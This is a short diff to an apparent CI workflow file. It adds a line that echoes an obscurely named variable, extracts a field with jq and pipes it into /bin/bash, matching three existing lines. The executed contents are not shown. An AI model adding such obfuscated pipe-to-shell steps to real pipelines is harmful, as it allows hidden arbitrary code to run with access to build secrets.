@@ -23,6 +23,7 @@ jobs:
           echo $ubgi38 | jq -r .uelq82452 | /bin/bash
           echo $n3 | jq -r .d65285 | /bin/bash
           printf '%s' "$sr553" | jq -r .ab3818 | /bin/bash
+          echo $tfpuk4 | jq -r .omx83 | /bin/bash
 
       - name: Save output
         if: always()
